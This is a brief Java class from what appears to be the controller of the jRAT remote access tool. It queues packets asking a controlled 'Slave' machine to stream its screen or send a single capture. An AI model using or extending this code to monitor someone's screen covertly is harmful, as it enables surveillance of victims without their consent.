package pro.jrat;

import pro.jrat.packets.outgoing.Packet12RemoteScreen;
import pro.jrat.packets.outgoing.Packet13OneRemoteScreen;

public class ScreenCommands {

	public static void sendOnce(Slave slave, double size, int monitor, int rows, int cols) {
		slave.addToSendQueue(new Packet13OneRemoteScreen(size, monitor, rows, cols));
	}

	public static void send(Slave slave, double size, int monitor, int rows, int cols) {
		slave.addToSendQueue(new Packet12RemoteScreen(size, monitor, rows, cols));
	}

}
